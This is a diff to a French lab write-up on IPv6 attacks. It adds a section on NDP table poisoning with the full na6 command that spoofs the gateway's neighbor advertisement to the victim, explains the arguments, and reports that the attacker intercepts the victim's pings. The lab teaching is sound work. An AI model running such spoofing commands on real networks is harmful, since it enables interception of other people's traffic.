@@ -16,20 +16,39 @@
 
 ## Tableau d'addressage
 
-| Name     | IP            | Gateway      | Description | MAC               |
-|----------|:-------------:|--------------|-------------|:-----------------:|
-| VM1      | 192.168.33.1  | -            | Gateway     | 00:50:00:00:01:00 |
-| VM2      | 192.168.33.10 | -            | Victime     | 00:50:00:00:04:00 |
-| Attacker | 192.168.33.11 | -            | Attaquant   | 00:50:00:00:05:00 |
+| Name     | IP            | MAC               | Description |
+|----------|:-------------:|:-----------------:|-------------|
+| VM1      | 192.168.33.1  | 00:50:00:00:01:00 |Gateway      |
+| VM2      | 192.168.33.10 | 00:50:00:00:04:00 |Victime      |
+| Attacker | 192.168.33.11 | 00:50:00:00:05:00 |Attaquant    |
 
 ## Corruption de la table NDP
 
 ### Outil à utiliser
+```
+na6
+```
 
-### Notes sur l'attaque
+### Commande
+```
+na6 -i ens3 -s 2001:db8:1:0:250:ff:fe00:100 -S 00:50:00:00:01:00 -d 2001:db8:1:0:250:ff:fe00:400 -t 2001:db8:1:0:250:ff:fe00:100 -E 00:50:00:00:05:00 -l
+```
+
+Arguments :
+- **-s** : IPv6 Source Address
+- **-S** : Link-layer Destination Address
+- **-d** : IPv6 Destination Address
+- **-t** : ND IPv6 Target Address
+- **-E** : Source link-layer address option
 
 ### Résultats
 
+![NDP Poisoning](./images/ndp_poisoning.gif)
+
+On constate donc que :
+- `vm2` ping `vm1` (sa Gateway)
+- `attacker` lance la commande na6 malicieuse
+- `attacker` récupère ainsi les pings émis par `vm2` (on peut le vérifier à l'aide de la commande *tcpdump*)
 
 ## Introduction de rogues RA sur un réseau IPv6
 
